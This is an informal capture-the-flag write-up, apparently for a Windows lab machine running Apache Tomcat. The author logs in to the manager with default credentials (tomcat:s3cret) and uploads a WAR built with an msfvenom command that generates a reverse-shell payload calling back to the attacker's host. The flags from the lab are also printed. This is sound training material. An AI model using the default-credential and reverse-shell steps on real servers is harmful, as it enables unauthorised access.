# Tasks

[**1. Which TCP port is open on the remote host?**](#task-1)

[**2. Which web server is running on the remote host? Looking for two words.**](#task-2)

[**3. Which relative path on the webserver leads to the Web Application Manager?**](#task-3)

[**4. What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password**](#task-4)

[**5. Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?**](#task-5)

[**6. User and Root Flags**](#user-and-root-flags)

# Tools Used

- nmap
- msfvenom

# Skills Used

- Finding and abusing default credentials
- Using msfvenom for crafting payloads

# Solutions

## Task 1

<img width="762" height="283" alt="image" src="https://github.com/user-attachments/assets/7d1c1545-1a09-4db0-8770-55c57de5c65b" />

Had to use the ```-Pn``` flag this time cuz for some reason the host wasn't being pinged lol.

**Answer: 8080**

## Task 2

Refer to the previous _nmap_ scan.

**Answer: Apache Tomcat**

## Task 3

Ok, time to check out the website.

<img width="1920" height="384" alt="image" src="https://github.com/user-attachments/assets/78637b04-e9a7-4aac-8e6a-71fc59c9d1bd" />

I'm guessing the answer is this, since I also came across this before being rejected:

<img width="1920" height="454" alt="image" src="https://github.com/user-attachments/assets/47db5583-4409-47b9-b803-a16f703e4035" />

**Answer: /manager/html**

## Task 4

Since the web server's using **Apache Tomcat**, I'll see if there are default credentials that I can find that could be used.

<img width="786" height="802" alt="image" src="https://github.com/user-attachments/assets/96b0269d-ccd5-4f04-a11a-13a134a8c280" />

I found a bunch lmao. 

Anyways, I just realized that in the previous pic where we found the directory, there were default credentials listed lmao.

**Answer: tomcat:s3cret**

## Task 5

<img width="1908" height="101" alt="image" src="https://github.com/user-attachments/assets/a755fa2a-f55e-4b5d-9a96-794b77bea67c" />

I'm guessing it's that, since that's pretty much the only upload feature in this page.

**Answer: WAR**

## User and Root Flags

Ok so going forward, I'm not sure what to do. This is my first Windows machine after all lol. So, I'm gonna use a writeup.

**A bit of searching and reading later**

Alright, apparently I have to use ```msfvenom```. Been a while since I used that, so I'll try to explain how it was used here.

**Command:**

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.8 LPORT=1234 -f war > revshell.war
```

Refer to my [_**other notes**_](https://www.notion.so/Metasploit-Commands-120675a946e480369970f6db49434425?source=copy_link) here for more details on each flag.

For this case, we'll need a **windows reverse shell payload**, which is why the following payload above was used. There are other payloads though, just use ```msfvenom -l payloads``` to see the others. 

<img width="399" height="62" alt="image" src="https://github.com/user-attachments/assets/6e8785fb-8440-4543-87e8-aab599003501" />

Anyways, we have our **war** file now, so let's upload this and see what happens.

<img width="1920" height="752" alt="image" src="https://github.com/user-attachments/assets/13f1ed10-f6dd-42be-bb20-2334788cad4d" />

<img width="1920" height="350" alt="image" src="https://github.com/user-attachments/assets/efdafc19-7a70-48b4-be15-16e1a9f0d112" />

Ok so it looks like it uploaded but I didn't get a revshell :/

I'm gonna refer to the writeup again.

**A bit of reading again later**

Apparently I have to use this to get the **jsp** file that the **war** file created:

```
jar -tf revshell.war
```

I'm not entirely sure how they found that you need to get that, could be something to do with the nature of **war** files, but I'm not entirely familiar enough with this concept to know if it's actually that lol. In any
case, apparently I don't have _JDK_ installed on my machine lol, so I went ahead and installed that first so I can get the **jsp** file I need.

<img width="636" height="159" alt="image" src="https://github.com/user-attachments/assets/3a552d43-3cdc-4128-9f32-0d4f07531fa8" />

There we go.

Now let's head over here to see if I can get the shell now:

<img width="1920" height="643" alt="image" src="https://github.com/user-attachments/assets/a92a3d42-53f7-4fcd-b832-f2476d4e18cc" />

Yeah something went wrong lol. Lemme just redo the whole payload real quick.

**A few minutes later**

<img width="482" height="166" alt="image" src="https://github.com/user-attachments/assets/c61786a6-bc52-477f-b272-cdf33aafb156" />

There we go lol. Now I gotta practice my **cmd** skills.

**Commands Used:**

```
dir // same functionality as ls
cd // literally the same as cd lmao
chdir // same functionality as pwd, though you kinda don't really need most of the time since the file path is displayed as-is
more // same functionality as cat
```

<img width="559" height="141" alt="image" src="https://github.com/user-attachments/assets/afbdc943-01c5-4dd6-a1a8-ee7118c36727" />

I'm not gonna bother showing much on me searching through the system lol, let's just say I went through a bunch of stuff.

Anyways, apparently both flags are here.

**User Flag: 7004dbcef0f854e0fb401875f26ebd00**

**Root Flag: 04a8b36e1545a455393d067e772fe90e**
